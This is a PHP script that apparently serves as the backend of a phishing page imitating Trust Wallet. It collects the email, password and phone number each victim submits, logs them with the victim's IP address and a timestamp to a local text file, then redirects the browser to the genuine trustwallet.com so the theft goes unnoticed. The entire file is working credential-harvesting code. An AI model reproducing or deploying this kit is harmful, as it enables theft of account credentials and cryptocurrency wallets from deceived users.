<?php
$file = "newerawede.txt";
$email = $_POST['email'];
$Password = $_POST['Password'];
$Phone = $_POST['Phone'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "+-------------------[-New PROSES-]-------------------+");
fwrite($handle, "\n");
fwrite($handle, "Email : ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Password : ");
fwrite($handle, "$Password");
fwrite($handle, "\n");
fwrite($handle, "Phone number : ");
fwrite($handle, "$Phone");
fwrite($handle, "\n");
fwrite($handle, "IP Address : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "+-------------------[-New PROSES-]-------------------+");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://trustwallet.com/\";
// -->
</script>";
?>
